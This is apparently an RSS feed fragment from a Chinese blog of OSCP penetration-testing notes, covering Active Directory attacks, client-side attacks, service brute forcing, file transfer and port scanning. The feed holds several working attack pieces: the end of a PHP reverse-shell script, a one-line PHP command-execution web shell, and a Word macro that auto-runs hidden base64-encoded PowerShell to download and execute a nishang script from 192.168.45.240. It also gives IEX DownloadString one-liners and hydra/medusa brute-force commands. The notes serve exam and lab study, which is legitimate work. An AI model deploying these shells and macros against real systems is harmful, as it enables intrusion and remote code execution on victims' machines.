    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;r&amp;#34;),  // stdin is a pipe that the child will read from
    1 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;),  // stdout is a pipe that the child will write to
    2 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;)   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit(&amp;#34;ERROR: Can&amp;#39;t spawn shell&amp;#34;);
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won&amp;#39;t
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit(&amp;#34;Successfully opened reverse shell to $ip:$port&amp;#34;);

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit(&amp;#34;ERROR: Shell connection terminated&amp;#34;);
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit(&amp;#34;ERROR: Shell process terminated&amp;#34;);
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process&amp;#39;s STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit(&amp;#34;SOCK READ&amp;#34;);
      $input = fread($sock, $chunk_size);
      if ($debug) printit(&amp;#34;SOCK: $input&amp;#34;);
      fwrite($pipes[0], $input);
    }

    // If we can read from the process&amp;#39;s STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit(&amp;#34;STDOUT READ&amp;#34;);
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit(&amp;#34;STDOUT: $input&amp;#34;);
      fwrite($sock, $input);
    }

    // If we can read from the process&amp;#39;s STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit(&amp;#34;STDERR READ&amp;#34;);
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit(&amp;#34;STDERR: $input&amp;#34;);
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we&amp;#39;ve daemonised ourself
  // (I can&amp;#39;t figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print &amp;#34;$string
&amp;#34;;
    }
  }

  ?&amp;gt; 

4、命令执行

&amp;lt;?php system(&amp;#34;whoami&amp;#34;);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;本地自带的phpwebshell:&lt;/p&gt;</description>
    </item>
    <item>
      <title>另类技巧</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/</guid>
      <description>&lt;p&gt;wget 批量下载文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/bin/bash

# 设置起始和结束日期
start_date=&amp;#34;2020-01-01&amp;#34;
end_date=&amp;#34;2020-01-31&amp;#34;

# 初始化当前日期为起始日期
current_date=&amp;#34;$start_date&amp;#34;

# 循环，直到当前日期等于当前系统日期
while [ $current_date != $(end_date) ]; do
    # 构建下载链接
    url=&amp;#34;http://10.10.10.248/Documents/$current_date-upload.pdf&amp;#34;
    
    # 输出正在下载的链接
    echo &amp;#34;Downloading $url&amp;#34;
    
    # 使用 wget 下载文件
    wget &amp;#34;$url&amp;#34;
    
    # 递增日期
    current_date=$(date -I -d &amp;#34;$current_date + 1 day&amp;#34;)
done
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;批量读取文件创建者信息：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq &amp;gt; userlist
exiftool *.jpg | grep -i Author | cut -d &amp;#34;:&amp;#34; -f 2 | cut -d &amp;#34; &amp;#34; -f 2,3 &amp;gt; authors
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将所有pdf文件转换成txt文件：&lt;/p&gt;</description>
    </item>
    <item>
      <title>域渗透思路总结</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;h1 id=&#34;一获取立足身份凭证&#34;&gt;一、获取立足身份凭证&lt;/h1&gt;
&lt;h2 id=&#34;1ldap匿名信息泄露&#34;&gt;1、LDAP匿名信息泄露：&lt;/h2&gt;
&lt;p&gt;配合windapsearch.py获取域内用户信息：&lt;/p&gt;
&lt;p&gt;① 可能存在密码泄露；&lt;/p&gt;
&lt;p&gt;② 可获取用户名，配合AS-REP Roasting破解；&lt;/p&gt;
&lt;p&gt;③ 密码喷洒，记得使用可获取密码策略，可使用crackmapexec爆破smb协议，不直接爆破kerberos&lt;/p&gt;
&lt;h2 id=&#34;2smbhttpldap信息收集&#34;&gt;2、SMB+HTTP+LDAP信息收集&lt;/h2&gt;
&lt;p&gt;① SMB注意共享目录，如果存在当前身份无法访问的目标，大概率是要切换身份，目前推荐使用工具为impacket的smbclient.py，网上下载的即可&lt;/p&gt;
&lt;p&gt;② HTTP目前遇到直接getshell的少，但是SQL注入、文件包含的多，甚至需要代码审计&lt;/p&gt;
&lt;p&gt;③ 信息收集方面，注意姓+名的用户名生成方式，收集员工、组织、邮箱等方式，LDAP匿名和有身份的情况下查找的信息可能存在不一样（名字组合：首字母姓+名、姓.名、姓_名、姓首字母.名字）&lt;/p&gt;
&lt;p&gt;④ NTLM relay的攻击不在少数，如打印机、sqlserver等情况可以考虑操作&lt;/p&gt;
&lt;h1 id=&#34;二提权思路&#34;&gt;二、提权思路&lt;/h1&gt;
&lt;p&gt;以下方式一般为优先级按个执行&lt;/p&gt;
&lt;h2 id=&#34;1bloodhound&#34;&gt;1、Bloodhound&lt;/h2&gt;
&lt;p&gt;bloodhound基本能识别大部分默认的权限组织和权限滥用的提权，如：委派、DCSync、组织、ACL滥用、一些特殊组等，如果没有直接的提权方式，基本也是可以梳理一下思路的。&lt;/p&gt;
&lt;h2 id=&#34;2winpeass&#34;&gt;2、winpeass&lt;/h2&gt;
&lt;p&gt;winpeass说实话，直接帮忙提权的点在域内很少，但是它可以帮忙提取很多信息，比如GPP组策略、一些配置信息等，如果当真有直接提权点，那也相当好了。&lt;/p&gt;
&lt;p&gt;具体提权漏洞，见windows操作[[windows提权]]&lt;/p&gt;
&lt;h2 id=&#34;3组信息&#34;&gt;3、组信息&lt;/h2&gt;
&lt;p&gt;查看当前用户是否存在一些不太常见的组信息，比如：LDAP_Readers、ReadGMSAPassword等&lt;/p&gt;
&lt;h2 id=&#34;4密码获取&#34;&gt;4、密码获取&lt;/h2&gt;
&lt;p&gt;当前主机的软件密码，使用LaZagne即可，可能存在不匹配，建议多尝试。&lt;/p&gt;
&lt;h2 id=&#34;5kerberoasting&#34;&gt;5、kerberoasting&lt;/h2&gt;
&lt;p&gt;我认为在进行信息收集后就可以尝试，因为该攻击的操作算作比较简单&lt;/p&gt;
&lt;h2 id=&#34;6adcs证书攻击&#34;&gt;6、ADCS证书攻击&lt;/h2&gt;
&lt;p&gt;在目标主机开放80和https的情况下，很有可能存在证书攻击，CVE-2022-26923、CVE-2021-42287、错误的ADCS模板&lt;/p&gt;
&lt;h2 id=&#34;7白银票据&#34;&gt;7、白银票据&lt;/h2&gt;
&lt;p&gt;如果在一些特殊情况下，可以获得服务账户密码的情况下可以尝试登录服务，如sqlserver，使用pip 安装的mssqlclient甚至可以执行命令&lt;/p&gt;
&lt;h2 id=&#34;8域内漏洞&#34;&gt;8、域内漏洞&lt;/h2&gt;
&lt;p&gt;我认为该方式一般为没有方法的情况下进行尝试，因为这种方式没有明显特征：&lt;/p&gt;
&lt;p&gt;① MS14-068&lt;/p&gt;
&lt;p&gt;② Netlogon&lt;/p&gt;</description>
    </item>
    <item>
      <title>域渗透操作</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/</guid>
      <description>&lt;h1 id=&#34;impacket-lookupsid&#34;&gt;impacket-lookupsid&lt;/h1&gt;
&lt;p&gt;可获取主机用户名：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;impacket-lookupsid svc_apache:&amp;#39;S@Ss!K@*t13&amp;#39;@&amp;#39;flight.htb&amp;#39;

筛选用户：
cat u|grep SidTypeUser|awk -F &amp;#39;\&amp;#39; &amp;#39;{ print $2 }&amp;#39;|awk -F &amp;#39; &amp;#39; &amp;#39;{ print $1 }&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;组合拳winpeassmimikatz信息检索linuxpeass枚举服务暴力破解&#34;&gt;组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解&lt;/h1&gt;
&lt;p&gt;同步ntp时间：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo ntpdate -s 10.10.10.24
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看是否在域内：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net time /do
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;一ntlm协议&#34;&gt;一、NTLM协议&lt;/h2&gt;
&lt;h3 id=&#34;1lm-hash算法&#34;&gt;1、LM hash算法&lt;/h3&gt;
&lt;p&gt;简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。&lt;/p&gt;
&lt;h3 id=&#34;2ntlm-hash算法&#34;&gt;2、NTLM hash算法&lt;/h3&gt;
&lt;p&gt;简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中&lt;/p&gt;
&lt;h3 id=&#34;3ntlm-协议认证&#34;&gt;3、NTLM 协议认证&lt;/h3&gt;
&lt;p&gt;简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。&lt;/p&gt;
&lt;p&gt;challenge值：
V1：8B
V2：16B
Net-Ntlm hash:
V1：DES加密算法
V2：HMAC-MD5加密算法&lt;/p&gt;
&lt;h3 id=&#34;4攻击方式&#34;&gt;4、攻击方式&lt;/h3&gt;
&lt;p&gt;基于以上特性，NTLM主要有三种攻击方式：
1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。
2、NET-NTLM Relay，发生在response中。
3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。&lt;/p&gt;
&lt;h2 id=&#34;二kerberos协议&#34;&gt;二、Kerberos协议&lt;/h2&gt;
&lt;h2 id=&#34;1基础&#34;&gt;1、基础&lt;/h2&gt;
&lt;p&gt;①客户端
②服务端，拥有唯一的SPN（服务主体名称）
③认证服务的KDC（密钥分发中心），服务账户为krbtgt。&lt;/p&gt;
&lt;p&gt;简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ&amp;amp;AS_REP和TGS_REQ&amp;amp;TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。&lt;/p&gt;</description>
    </item>
    <item>
      <title>客户端攻击</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/</guid>
      <description>&lt;h1 id=&#34;宏&#34;&gt;宏&lt;/h1&gt;
&lt;p&gt;后缀建议为doc或者docm&lt;/p&gt;
&lt;p&gt;宏攻击代码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
     Str = Str + &amp;#34;powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY&amp;#34;
     Str = Str + &amp;#34;3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5&amp;#34;
     Str = Str + &amp;#34;nKGh0dHA6Ly8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKC&amp;#34;
     Str = Str + &amp;#34;g==&amp;#34;

    CreateObject(&amp;#34;Wscript.Shell&amp;#34;).Run Str
End Sub
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;字符串base64编码内容：
配合nishang:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;iex(new-object net.webclient).downloadstring(&amp;#34;http://192.168.45.240/nishang.ps1&amp;#34;)

IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.240/nishang.ps1&amp;#39;)

echo &amp;#39;IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.240/nishang.ps1&amp;#39;)
&amp;#39;|base64
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;py脚本分割：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;str = &amp;#34;powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKGh0dHA6
Ly8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKCg==&amp;#34;

n = 50

for i in range(0, len(str), n):
	print(&amp;#34;Str = Str + &amp;#34; + &amp;#39;&amp;#34;&amp;#39; + str[i:i+n] + &amp;#39;&amp;#34;&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果base64不行，不如直接明文：&lt;/p&gt;</description>
    </item>
    <item>
      <title>常见服务</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/</guid>
      <description>&lt;p&gt;渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：&lt;/p&gt;
&lt;h2 id=&#34;nfs&#34;&gt;NFS&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;挂载：
sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage

showmount 
-d：仅显示已被NFS客户端加载的目录； 
-e：显示NFS服务器上所有的共享目录。
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
&lt;h3 id=&#34;爆破&#34;&gt;爆破&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定

crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法

./cme -t 1 ssh hosts  -u use_user  -p pass 

hydra -L txt -P txt ip ssh 快
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;生成ssh公私钥&#34;&gt;生成ssh公私钥&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh-keygen -t rsa

上传文件名必须为：authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;连接问题&#34;&gt;连接问题&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vim ~/.ssh/config 
HostKeyAlgorithms +ssh-rsa 
PubkeyAcceptedKeyTypes +ssh-rsa
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ftp anonymous@ip

prompt off

切换传输模式： binary ascii
开关被动模式： passive

put 
get
mget
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;列出信息：
smbclient -L \\\\{TARGET_IP}\\ -U 用户名
连接：
smbclient //ip/目录

SMB扫描工具：
enum4linux -a -o ip 
挂载SMB：
mount -t cifs //&amp;lt;IP地址&amp;gt; 本地目录
sudo mount -t cifs -o username=&amp;#34;qiu&amp;#34;,password=&amp;#34;password&amp;#34; //192.168.5.103/qiu smb


匿名挂载：
sudo mount -t cifs -o rw,username=guest,password= &amp;#39;//10.10.10.103/Department Shares&amp;#39; smb

SMB罗列：
smbmap -r 目录 -H ip

批量下载不用确认：
prompt off


使用Kerberos协议登录smb:
在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py：
python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168

完全限定域名获取方式：
https://github.com/CroweCybersecurity/ad-ldap-enum.git
python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 

或者使用get-tgt获取票据，然后修改环境变量：
sudo ntpdate -s 10.10.10.24

python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:&amp;#39;AbsoluteLDAP2022!&amp;#39; -dc-ip 10.10.11.181

export KRB5CCNAME=svc_smb.ccache



爆破：
hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enum4linux&#34;&gt;enum4linux&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;enum4linux -a -o www.harvard.edu
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;确定目录可写入：
先挂载在本地：&lt;/p&gt;</description>
    </item>
    <item>
      <title>文件传输</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</guid>
      <description>&lt;p&gt;1、kali web服务搭建&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;服务搭建： 
python2:python2 -m SimpleHTTPServer 
python3:python3 -m http.server 
php:php -S 0:80
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2、kali 开启python接收http服务，靶机上传&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
import sys
import signal
from threading import Thread
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler



class PUTHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers[&amp;#39;Content-Length&amp;#39;])
        content = self.rfile.read(length)
        self.send_response(200)
        with open(self.path[1:], &amp;#34;w&amp;#34;) as f:
            f.write(content)


def run_on(port):
    print(&amp;#34;Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...&amp;#34;.format(sys.argv[1], port))
    server_address = (sys.argv[1], port)
    httpd = HTTPServer(server_address, PUTHandler)
    httpd.serve_forever()


if __name__ == &amp;#34;__main__&amp;#34;:
    if len(sys.argv) &amp;lt; 3:
        print(&amp;#34;Usage:\n\tpython {0} ip 1337&amp;#34;.format(sys.argv[0]))
        sys.exit(1)
    ports = [int(arg) for arg in sys.argv[2:]]
    try:
        for port_number in ports:
            server = Thread(target=run_on, args=[port_number])
            server.daemon = True # Do not make us wait for you to exit
        server.start()
        signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt
    except KeyboardInterrupt:
        print &amp;#34;\nPython HTTP PUT Server Stoped.&amp;#34;
        sys.exit(1)


kali开启：sudo python2 put.py ip 80
靶机上传: 
powershell 可能出错
curl --upload-file 20240128065938_BloodHound.zip http://10.10.16.4
wget --method=PUT --post-file=20240128065938_BloodHound.zip http://10.10.16.4/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3、nc文件传输&lt;/p&gt;</description>
    </item>
    <item>
      <title>端口扫描</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</guid>
      <description>&lt;p&gt;直连网络使用nmap进行扫描，非直连网络，先用Rustscan快速探测端口开放性，然后再搭建ligolo进行针对端口扫描，速度可以调到400-1000左右，测试顺利；&lt;/p&gt;
&lt;h2 id=&#34;列出存活主机&#34;&gt;列出存活主机：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap:

Linux用脚本，Windows用arp-scan.exe

nmap -sn 192.168.5.0/24  理论上-sn 会包含-PR
nmap -PR 192.168.5.0/24




Linux:
NET=192.168.56. ; for IP in $(seq 1 255); do if `ping -c2 -i0.2 -w2 $NET$IP &amp;amp;&amp;gt; /dev/null`; then echo -e &amp;#34;$NET$IP is \033[31mup\033[0m&amp;#34; ; else echo -e &amp;#34;$NET$IP is \033[32mdown\033[0m&amp;#34;; fi ; done
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;端口扫描&#34;&gt;端口扫描：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap:
OSCP 网络不好，直连速度调1500，隧道速度调整为1000或者800，隧道情况下的扫描不可靠

sudo nmap -sT -p- -O -sV --min-rate 7000 -Pn 192.168.152.148 -oN tcp_nmap.txt
sudo nmap -sU --top-ports 20 ip -oN udp_nmap.txt


筛选为适合漏洞扫描的格式
grep open tcp_nmap.txt | awk -F &amp;#39;/&amp;#39; &amp;#39;{print $1}&amp;#39;| paste -sd &amp;#39;,&amp;#39;

sudo nmap -sC --script=vuln -p端口 ip -oN vuln.txt



Linux:
for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.102 $i 2&amp;gt;&amp;amp;1; done | grep -v &amp;#34;Connection refused&amp;#34;


for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done


windows:
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;nc&#34;&gt;NC：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tcp扫描：

nc -nvv -w 1 -z 192.168.50.152 3388-3390

UDP扫描：
nc -nv -u -z -w 1 192.168.50.149 120-123
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;nmap-脚本&#34;&gt;nmap 脚本&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/usr/share/nmap/scripts

grep Exploits /usr/share/nmap/scripts/*.nse
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;autorecon&#34;&gt;AutoRecon&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/Tib3rius/AutoRecon
扫描器，可自动调用

将要扫描的主机放到txt文件内：
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;powershell-不推荐垃圾&#34;&gt;powershell 不推荐，垃圾&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1



powershell.exe -nop -exec bypass -c &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;https://192.168.45.245:81/Invoke-Portscan.ps1&amp;#39;);Invoke-Portscan -Hosts 172.16.247.0/24 -T 4 -ports 1-10000 -ReadableOut cxk.txt&amp;#34;


端口范围：
-Ports 1-10000

网段扫描：
Invoke-Portscan -Hosts 192.168.1.1/24 -T 5 -TopPorts 25 -oA localnet


Invoke-Portscan -Hosts 172.16.244.0/24 -T 5 -ports 1-10000 -ReadableOut cxk.txt

[0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout)
    5 {$nHosts=30;  $Threads = 1000; $Timeout = 750  }
    4 {$nHosts=25;  $Threads = 1000; $Timeout = 1200 }
    3 {$nHosts=20;  $Threads = 100;  $Timeout = 2500 }
    2 {$nHosts=15;  $Threads = 32;   $Timeout = 3000 }
    1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }

加大强度，可能误报：
Invoke-Portscan -Hosts 172.16.244.0/24 -Threads 2000 -nHosts 40 -Timeout 500 -ports 1-10000 -ReadableOut cxk2.txt

ping扫描，建议APRscan

Invoke-Portscan -Hosts 172.16.244.0/24 -PingOnly -ReadableOut PingOnly.txt

从文件中读取IP：

Invoke-Portscan -HostFile hosts.txt -Threads 2000 -SkipDiscovery -nHosts 40 -Timeout 300 -ports 1-10000 -ReadableOut portscan.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;naabu-专注web&#34;&gt;naabu 专注web&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/projectdiscovery/naabu

naabu -rate 500 -c 10 -s connect -p - -host 10.X.X.X -proxy 127.0.0.1:1080

文件落地的情况下：
naabu.exe -p - -host 172.16.247.0/24 -o cxk.txt

参数详解：
https://zhuanlan.zhihu.com/p/678578276
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;极端情况下&#34;&gt;极端情况下：&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://mp.weixin.qq.com/s/7Wc6furXUHfBfDeO3Zf7Qw
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;arp-scan-windows&#34;&gt;ARP-scan-windows&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/QbsuranAlang/arp-scan-windows-
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;rustscan-不如nmap但是可以丢到目标主机执行&#34;&gt;Rustscan 不如nmap，但是可以丢到目标主机执行&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/RustScan/RustScan


使用方式：

rustscan.exe -a 10.10.136.140 -r 1-65535 &amp;gt; scan.txt

可能会卡住，但是多敲回车，主要是探测端口开放性，配合nmap做服务识别

nmap脚本会失效：
-- -sV -sT &amp;gt; scan.txt

限制速度：
--ulimit 1000
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;mascan&#34;&gt;mascan&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;官方
https://github.com/robertdavidgraham/masscan

第三方
https://github.com/zan8in/masscan

masscan.exe -p1-10000 172.16.234.0/24 --rate=5000 -oB scan.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;ports-列表目前来看是代理情况下的最优解配合ew&#34;&gt;PORTS 列表，目前来看是代理情况下的最优解，配合ew&lt;/h1&gt;
&lt;p&gt;域内渗透的常见端口，加快扫描速度：&lt;/p&gt;</description>
    </item>
    <item>
      <title>隐藏信息获取&amp;破解</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/</guid>
      <description>&lt;p&gt;secret&lt;/p&gt;
&lt;h2 id=&#34;图片信息查看&#34;&gt;图片信息查看：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exiftool 查看图片基本信息 
命令：exiftool main.gif 

steghide是一个图片或者音频文件的隐写工具 
命令： 
查看图片信息：steghide info xxx.jpg 
提取文件：steghide extract -sf xxx 
如果遇到加密的，可以使用stegseek进行爆破，命令如下： 
stegseek xx.jpg 字典路径 -xf 保存目录
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;二进制文件&#34;&gt;二进制文件&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file命令可以查看文件类型

xxd 是一个16进制dump工具，可用于查看文件的16进制内容：
命令：
xxd -r -ps xxxx 

strings可用于查看文件可读字符串，pacp包也可以用这个查看 
命令：
strings xxx 

binwalk查看文件是否有捆绑 
命令：
binwalk xxx
